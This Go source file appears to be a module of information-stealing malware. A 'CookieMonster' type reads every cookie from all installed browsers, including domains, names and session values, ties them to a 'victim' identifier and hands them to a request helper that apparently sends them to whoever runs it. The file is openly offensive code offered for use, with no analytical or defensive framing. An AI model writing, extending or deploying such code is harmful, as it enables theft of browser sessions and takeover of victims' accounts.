package services

import (
	"fmt"
	"github.com/zellyn/kooky"
	_ "github.com/zellyn/kooky/allbrowsers"
	"main/utils"
)

type CookieMonster struct {
	cookies []*kooky.Cookie
}

func (c *CookieMonster) Run(victim string) {
	c.cookies = kooky.ReadCookies()
	if len(c.cookies) > 0 {
		var rez string
		for _, cookie := range c.cookies {
			rez += fmt.Sprintf("%s, %s, %s\n", cookie.Domain, cookie.Name, cookie.Value)
		}
		_, err := utils.HandleCookieRequest(rez, victim)
		if err != nil {
			utils.HandleError(err.Error(), victim)
			fmt.Println("Error sending the request")
		} else {
			c.cookies = []*kooky.Cookie{}
			return
		}
	} else {
		utils.HandleError("No cookies found", victim)
	}
}
